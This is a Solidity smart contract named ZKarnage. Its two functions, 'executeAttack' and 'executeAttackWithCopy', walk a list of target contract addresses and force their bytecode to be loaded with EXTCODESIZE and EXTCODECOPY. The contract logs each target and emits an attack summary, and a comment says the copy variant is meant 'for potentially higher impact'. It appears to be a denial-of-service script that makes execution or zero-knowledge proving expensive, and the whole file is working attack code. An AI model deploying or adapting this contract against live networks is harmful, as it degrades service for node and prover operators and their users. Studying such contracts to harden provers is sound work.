// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract ZKarnage {
    event ContractAccessed(address indexed target, uint256 size);
    event AttackSummary(uint256 numContracts, uint256 totalSize);
    
    function executeAttack(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 size;
            
            assembly {
                size := extcodesize(target)
            }
            
            totalSize += size;
            emit ContractAccessed(target, size);
        }
        
        emit AttackSummary(targets.length, totalSize);
    }
    
    /**
     * @notice Alternative method using EXTCODECOPY for potentially higher impact
     * @param targets Array of contract addresses to target
     */
    function executeAttackWithCopy(address[] calldata targets) external {
        uint256 totalSize = 0;
        
        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 size = target.code.length;
            totalSize += size;
            
            // Store target address in memory
            address memTarget = target;
            
            assembly {
                extcodecopy(
                    memTarget,           // target address from memory
                    0x80,                // memory offset
                    0,                   // code offset
                    size                 // length
                )
            }
            
            emit ContractAccessed(target, size);
        }
        
        emit AttackSummary(targets.length, totalSize);
    }
}